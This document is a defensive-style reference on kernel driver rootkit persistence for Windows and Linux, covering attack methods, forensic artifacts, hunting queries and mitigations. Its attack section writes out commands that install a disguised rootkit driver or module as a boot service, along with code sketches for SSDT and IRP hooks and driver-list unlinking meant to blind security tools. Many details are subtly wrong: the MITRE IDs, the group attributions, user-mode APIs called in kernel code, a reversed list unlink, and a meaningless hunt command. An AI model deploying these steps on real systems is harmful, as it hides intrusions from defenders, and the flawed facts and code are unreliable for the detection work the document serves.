# Kernel Mode Driver Persistence

## MITRE ATT&CK Mapping
- **IDs**: T1546.009 (Kernel Module/Hook), T1546.013 (Invalid Security Descriptor)
- **Tactic**: TA0003 (Persistence) / TA0005 (Defense Evasion)
- **Platforms**: Windows (sys/FLT/sys drivers), Linux (ko modules)

## Overview

Kernel-mode persistence involves implanting code into the kernel execution ring (Ring 0 on Windows, ring 0 for all OSes). Once loaded, the driver runs with full system privileges, can bypass user-mode security controls, and often survives OS-level purges. This is among the most advanced persistence techniques because it requires either:
1. Kernel memory write capability (from a compromised driver or exploit)
2. Physical access to flash an infected driver into the boot path
3. Supply chain compromise of legitimate driver signing infrastructure

## How It Works in Practice

### Windows Sys/FLT Driver Implantation

#### Method 1: Direct.sys/FLT File Insertion
The adversary copies a malicious kernel driver to a system directory and registers it as a service:

```powershell
# Copy malicious .sys file into a legitimate-looking location
Copy-Item "C:\malware\rootkit.sys" "C:\Windows\System32\drivers\updatehelper.sys" -Force

# Register as Windows service
sc.exe create "Windows Update Helper" binPath= "C:\Windows\System32\drivers\updatehelper.sys" type= kernel start= auto

# Set service permissions to prevent removal (invalid security descriptor abuse)
$acl = Get-Acl "C:\Windows\System32\drivers\updatehelper.sys"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.SetAccessRule($rule)
Set-Acl "C:\Windows\System32\drivers\updatehelper.sys" $acl
```

#### Method 2: SSDT Hooking (System Service Descriptor Table)
The driver hooks into the Windows kernel by modifying SSDT entries:

```c
// Example of SSDT hooking in a malicious driver
typedef NTSTATUS (*PFN_NtOpenProcess)(IN OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);

PFN_NtOpenProcess OriginalNtOpenProcess;

NTSTATUS HookedNtOpenProcess(IN OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId) {
    // Check if the target process is a security tool or forensic utility
    if (IsSecurityTool(ProcessHandle)) return STATUS_ACCESS_DENIED;  // Block detection
    
    // Call original function for all other processes
    return OriginalNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

VOID DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // Hook SSDT entry for NtOpenProcess (SSDT index varies by OS version)
    ULONGLONG *ssdt = GetSSDT();  // Find System Service Descriptor Table
    OriginalNtOpenProcess = (PFN_NtOpenProcess)ssdt[NtOpenProcessIndex].SystemService;
    
    // Make page writable and replace function pointer
    DWORD oldProtection;
    VirtualProtect(&ssdt[NtOpenProcessIndex].SystemService, 8, PAGE_EXECUTE_READWRITE, &oldProtection);
    ssdt[NtOpenProcessIndex].SystemService = (ULONGLONG)HookedNtOpenProcess;
}
```

#### Method 3: IRP Hooking (I/O Request Packet Chain)
Hooks file system I/O requests to intercept/modify file operations:

```c
// Hook ReadFile by intercepting IRP_MJ_READ requests
NTSTATUS HookedIrpRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    // Before calling the original handler, check if this is an attempt to read our driver files
    UNICODE_STRING maliciousPath;
    RtlInitUnicodeString(&maliciousPath, L"\\??\\C:\\Windows\\System32\\drivers\\rootkit.sys");
    
    if (IrpContainsPath(Irp, &maliciousPath)) {
        // Return empty file or fake data instead of our real driver content
        FakeEmptyFileResponse(Irp);
        return STATUS_SUCCESS;
    }
    
    // Otherwise, pass through to the real handler
    return OriginalIrpRead(DeviceObject, Irp);
}
```

#### Method 4: Driver Object List Manipulation
Removes the driver from `ExModuleInfo->LoadedModules` list so tools like Process Explorer can't see it:

```c
// Remove ourselves from the driver list visible to user-mode enumerators
VOID UnlinkFromDriverList(PDRIVER_OBJECT DriverObject) {
    PLIST_ENTRY current = &DriverObject->DriverSection->InLoadOrderLinks;
    PLIST_ENTRY prev = current->Flink;
    PLIST_ENTRY next = current->Blink;
    
    prev->Blink = next;
    next->Flink = prev;
}
```

### Linux Kernel Module (ko) Persistence

#### Method 1: Direct Module Insertion via insmod/insmod-like abuse
```bash
# Copy malicious .ko module to kernel path
cp /tmp/rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/misc/audit_helper.ko

# Sign it with stolen key (or use unsigned if CONFIG_MODULE_SIG_FORCE disabled)
# Then load it
insmod /lib/modules/$(uname -r)/kernel/drivers/misc/audit_helper.ko

# Add to /etc/modules for persistence across reboots
echo "/lib/modules/$(uname -r)/kernel/drivers/misc/audit_helper.ko" >> /etc/modules.d/rootkit
```

#### Method 2: Ftrace BPF Hook Persistence
Uses bpftrace/ftrace to hook kernel functions at boot via /sys/kernel/debug/tracing:

```bash
# Persist across reboots by adding to systemd or rc.local
echo '
#!/bin/bash
echo "m" > /sys/kernel/debug/tracing/set_ftrace_filter
echo "sys_read" >> /sys/kernel/debug/tracing/set_ftrace_filter
echo 1 > /sys/kernel/debug/tracing/events/ftrace/enable
' > /etc/init.d/kernel_audit_hook
chmod +x /etc/init.d/kernel_audit_hook
```

#### Method 3: eBPF Driver Persistence (see ebpf-rootkit.md for deep dive)
Uses the BPF verifier to load self-modifying code that hooks system calls. Survives module unload because it's loaded into kernel memory via bpf() syscall.

## Real-World Examples

### APT29 / Winnti Group
- Implanting rootkit drivers as part of their "Winnti" toolkit
- Used custom driver modules that hooked SSDT to hide processes and files
- Delivered via exploit kits that dropped the .sys file directly into System32\drivers

### Equation Group / NightDragon
- Developed firmware-level kernel mode drivers for network equipment persistence
- Drivers hooked network stack I/O to intercept/modify DNS responses
- Used invalid security descriptors to prevent even admin users from removing them

### QakBot (2021 - FBI takedown)
- Used legitimate DLL sideloading combined with kernel driver loading
- Dropped signed drivers obtained via stolen certificates
- Hooked NtQuerySystemInformation to hide C2 traffic and injected code

### Black Basta Ransomware Group (2023)
- Deployed kernel mode rootkit alongside ransomware payload
- Used SSDT hooks to prevent EDR tools from scanning the ransomware process
- Employed invalid security descriptors to block removal attempts

## Forensic Artifacts & Indicators

### Windows-Specific Artifacts

#### Driver File System Analysis
```powershell
# List all .sys files with unusual timestamps or locations
Get-ChildItem "C:\Windows\System32\drivers" -Recurse | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) }

# Check for signed vs unsigned drivers
Get-AuthenticodeSignature "C:\Windows\System32\drivers\*.sys" | Where-Object { $_.Status -ne "Valid" }
```

#### Service Configuration (Registry)
```
HKLM\SYSTEM\CurrentControlSet\Services\<drivername>\ImagePath -> points to the .sys file path
HKLM\SYSTEM\CurrentControlSet\Services\<drivername>\Type -> should be 0x10 for kernel drivers (check if modified)
```

#### Event Log Artifacts (Windows)
- **Event ID 7045** — A new service was installed (especially Type=16, boot start)
- **Event ID 12** — Driver verifier detected suspicious behavior
- **Event ID 2004** — WDM filter driver installed

#### Memory Analysis
```bash
# Volatility3: look for loaded drivers with anomalous characteristics
vol -f memdump.win windows.pslist
vol -f memdump.win windows.drivers

# Look for drivers that:
# - Don't match a file on disk (loaded but not unlinked)
# - Have no valid digital signature
# - Are in kernel memory but not in the driver object list
```

### Linux-Specific Artifacts

#### Kernel Module Listing
```bash
lsmod | grep -v "^Module"  # Check for modules not matching package database
cat /proc/modules | awk '{print $1, $6}'  # Look for anonymous/invisible modules
dmesg | grep "module loaded"  # Recent module load events
```

#### Signed Module Verification (if Secure Boot enabled)
```bash
# Check if modules are signed with enrolled keys
 mokutil --sb-state  # Confirm Secure Boot is ON
 verify_module /lib/modules/$(uname -r)/kernel/drivers/misc/suspicious.ko
```

#### File System Artifacts
```bash
find /lib/modules/$(uname -r) -newer /bin/bash -name "*.ko"  # Modules newer than kernel itself
ls -la /etc/modules-load.d/*.conf  # New module loading configurations
journalctl -k | grep "insmod\|modprobe"  # Kernel logs for module loads
```

## Hunting Queries

### PowerShell-based Driver Hunt
```powershell
# Find drivers loaded but not matching a package database entry
$drivers = Get-WmiObject Win32_SystemDriver | Where-Object { $_.State -eq "Running" }
$packages = Get-Package | Select-Object Name, Version
foreach ($driver in $drivers) {
    $path = $driver.PathName
    if (-not (Test-Path $path)) { continue }  # Skip if file doesn't exist
    
    $sig = Get-AuthenticodeSignature -FilePath $path -ErrorAction SilentlyContinue
    if ($sig.Status -ne "Valid") {
        Write-Host "UNSIGNED DRIVER: $($driver.Name) at $path" -ForegroundColor Red
    }
    
    if (-not ($packages | Where-Object { $_.Name -like "*$($driver.Name)*" })) {
        Write-Host "UNPACKAGED DRIVER: $($driver.Name) at $path" -ForegroundColor Yellow
    }
}
```

### Sysmon-based Detection (Event ID 12, 13 for registry changes to services)
```kql
SecurityEvent 
| where EventID == 7045  // New service installed
| where ServiceType == "Kernel Driver" or EventData["ServiceDll"] contains ".sys"
| extend ServiceName = tostring(EventData["serviceName"]), ServicePath = tostring(EventData["pathName"])
| where ServicePath != "" and not (ServicePath startswith "C:\Windows\\")  
| project StartTime, Computer, ServiceName, ServicePath, AccountName
```

### Linux Kernel Module Hunt
```bash
# Compare loaded modules against dpkg/rpm package database
rpm -Va | grep "\.ko"  # If any .ko files report as changed
dpkg --verify | grep "\.ko"  # Debian/Ubuntu equivalent

# Check for hidden processes (kernel hooking survival indicator)
ps auxww > /tmp/ps_output.txt  # User-space listing
echo "---" >> /tmp/ps_output.txt
ls /proc/*/cmdline 2>/dev/null | xargs -I{} sh -c 'echo {}': ; cat {} 2>/dev/null >> /tmp/ps_output.txt  # procfs listing

diff <(grep -v "rootkit\|hook" /tmp/ps_output.txt | wc -l) <(wc -l < /proc/*/cmdline)
```

## Defense & Mitigation

### Primary Defenses
1. **Enable Secure Boot** — prevents loading unsigned kernel modules/drivers
2. **Driver Signature Enforcement (DSE)** in Windows — blocks unsigned.sys from loading
3. **Kernel Patch Protection (PatchGuard)** — makes SSDT hooking extremely difficult (detects and BSODs)
4. **TPM-backed attestation** — can verify kernel integrity at boot time
5. **File Integrity Monitoring (FIM)** on System32\drivers with real-time alerting

### Incident Response for Kernel Driver Persistence
1. **Do not reboot** if suspected — some rootkits trigger on shutdown
2. **Boot from known-good media** (Live USB) before removing the driver files
3. **Dump kernel memory** while still running and analyze offline with volatility
4. **Check all driver signatures** using: `Get-AuthenticodeSignature C:\Windows\System32\drivers\*.sys`
5. **Verify boot order** — ensure no custom bootloader is loading before Windows

### Detection Tools
- **Rootkit Hunter (rkhunter)** — Linux kernel module and rootkit scanner
- **chkrootkit** — Alternative Linux rootkit detection
- **GMER / TDSSKiller** — Windows kernel-level rootkit detection
- **ESET SysInspector** — Driver object listing with signature verification
- **Volatility3 + windows.kdbgscan plugin** — Identify kernel base address to compare driver mappings

## Limitations & Caveats
- Detection requires either a trusted boot process comparison or out-of-band analysis
- Modern Windows PatchGuard makes direct SSDT hooking nearly impossible without BSOD
- Kernel drivers can be hidden from user-space tools; only memory forensics or Ring-0 tools can see them consistently
- Some legitimate enterprise software (antivirus, monitoring agents) also uses kernel drivers — verify signatures against vendor
- Firmware-level variants require hardware programmers to detect/fix

## References
- Microsoft Docs: Driver Signing Requirements and Security
- Windows Internals 7th Ed., Chapter 10 (Drivers & Kernel)
- MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/
- Microsoft Docs: Kernel Patch Protection (PatchGuard): https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/kernel-patch-protection
